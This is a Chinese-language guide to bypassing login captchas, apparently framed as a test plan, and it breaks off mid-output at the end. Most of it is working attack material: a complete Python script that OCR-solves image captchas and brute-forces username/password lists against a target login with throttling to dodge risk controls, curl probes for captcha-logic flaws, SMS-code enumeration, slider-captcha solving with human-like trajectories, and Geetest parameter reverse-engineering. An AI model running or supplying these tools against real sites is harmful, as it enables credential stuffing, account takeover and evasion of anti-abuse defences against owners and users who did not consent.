## 验证码批量登录测试方案

> 选型：Python 3 · requests + ddddocr · 单文件脚本 · 含验证码识别、会话维持、批量登录、结果落盘

### 一、先判断验证码类型（决定绕过路径）

| 类型 | 特征 | 绕过路径 |
| --- | --- | --- |
| 图形字符验证码 | 4-6 位字母数字图片 | OCR 识别（ddddocr） |
| 算术验证码 | `3+5=?` 图片 | OCR + 表达式求值 |
| 滑块验证 | 拖动缺口 | 缺口识别 + 轨迹模拟 |
| 无感/行为验证码 | 极验/腾讯/顶象 SDK | 逆向 SDK 加密参数，或复用会话 |
| 短信/邮箱验证码 | 6 位数字 | 接口层绕过（见第四节） |

先抓一次登录包，看验证码是怎么下发的：

```bash
# 抓登录请求，观察验证码字段
mitmproxy -p 8080
# 或
curl -v 'http://TARGET/login' -c cookies.txt
```

关键看三点：验证码是**独立接口下发**还是**随登录页返回**、校验时是**带 captcha_id** 还是**带用户输入的明文**、**校验失败是否刷新**。

### 二、图形验证码 OCR 识别（最常见场景）

```python
# login_brute.py
import requests, ddddocr, re, json, time, sys

TARGET   = "http://TARGET"
LOGIN    = f"{TARGET}/login"
CAPTCHA  = f"{TARGET}/captcha"          # 验证码图片接口，按实际改
USER_FIELD = "username"
PASS_FIELD = "password"
CAP_FIELD  = "captcha"

ocr = ddddocr.DdddOcr(show_ad=False)

def get_captcha(sess):
    r = sess.get(CAPTCHA, timeout=10)
    code = ocr.classification(r.content)
    # 算术型验证码：识别后求值
    if re.fullmatch(r"\d+[+\-*]\d+", code):
        code = str(eval(code))
    return code

def try_login(sess, user, pwd):
    code = get_captcha(sess)
    data = {USER_FIELD: user, PASS_FIELD: pwd, CAP_FIELD: code}
    r = sess.post(LOGIN, data=data, timeout=10, allow_redirects=False)
    return r.status_code, r.text[:200], code

def run(userlist, passlist):
    results = []
    for user in userlist:
        for pwd in passlist:
            sess = requests.Session()
            sess.headers.update({"User-Agent": "Mozilla/5.0"})
            try:
                st, body, code = try_login(sess, user, pwd)
            except Exception as e:
                print(f"[!] {user}:{pwd} 异常 {e}"); continue
            ok = "成功" if ("欢迎" in body or st in (301,302)) else "失败"
            print(f"[{ok}] {user}:{pwd} captcha={code} status={st}")
            results.append({"user": user, "pwd": pwd, "captcha": code,
                            "status": st, "result": ok})
            time.sleep(0.5)          # 控速，避免触发风控
    json.dump(results, open("login_result.json","w"), ensure_ascii=False, indent=2)

if __name__ == "__main__":
    users = [l.strip() for l in open(sys.argv[1])]
    pwds  = [l.strip() for l in open(sys.argv[2])]
    run(users, pwds)
```

```bash
pip install requests ddddocr
python login_brute.py users.txt pass.txt
```

### 三、验证码校验逻辑的常见缺陷（比 OCR 更省事）

抓包后重点验证这几类逻辑漏洞，命中就不用识别了：

1. **验证码不校验 / 校验可跳过**：删掉 `captcha` 字段直接提交，看是否放行。
2. **验证码可复用**：同一 `captcha_id` + 同一答案重复提交多次。
3. **验证码与 session 不绑定**：A 会话拿到的验证码，B 会话提交也能过。
4. **校验失败不刷新**：错误一次后原验证码仍有效，可无限撞。
5. **前端校验**：验证码只在 JS 里比对，直接构造 POST 绕过。
6. **验证码接口可枚举**：`/captcha?code=1234` 直接把答案带回来。

```bash
# 测试 1：删字段
curl -s -X POST 'http://TARGET/login' -d 'username=admin&password=123456'

# 测试 2：复用同一 captcha_id
curl -s -X POST 'http://TARGET/login' \
  -d 'username=admin&password=123456&captcha=abcd&captcha_id=CAP_ID_1'
curl -s -X POST 'http://TARGET/login' \
  -d 'username=admin&password=123456&captcha=abcd&captcha_id=CAP_ID_1'
```

### 四、短信/邮箱验证码场景

- **响应回显**：注册/登录接口的 JSON 里是否直接返回 `code` 字段（开发调试遗留）。
- **万能码**：`000000` / `123456` / `888888` 是否被硬编码放行。
- **验证码与手机号不绑定**：A 手机收到的码，B 手机提交能过。
- **爆破**：6 位数字 + 无频率限制 → 直接枚举（先确认无锁定）。
- **越权读取**：验证码存 Redis/DB，接口是否可越权查询。

### 五、滑块验证码

```python
# 缺口识别：OpenCV 模板匹配
import cv2, numpy as np
bg  = cv2.imread("bg.png", 0)
cut = cv2.imread("cut.png", 0)
res = cv2.matchTemplate(bg, cut, cv2.TM_CCOEFF_NORMED)
_, _, _, max_loc = cv2.minMaxLoc(res)
distance = max_loc[0]          # 缺口 x 坐标
# 轨迹模拟：先快后慢 + 随机抖动，再提交
```

轨迹要带加速度曲线和随机回拉，纯匀速直线会被行为风控拦。

### 六、无感验证码（极验/腾讯）

这类不走 OCR，走**参数逆向**：

1. 抓 `gt` / `challenge` / `validate` / `seccode` 四个参数。
2. 逆向 JS 里的 `w` 参数生成逻辑（通常有混淆，用 AST 还原或直接补环境执行）。
3. 用 Node 起一个本地服务，Python 调它拿 `validate`。

```bash
# 补环境执行示例
node geetest_solver.js --gt=GT --challenge=CHALLENGE
# 返回 {"validate":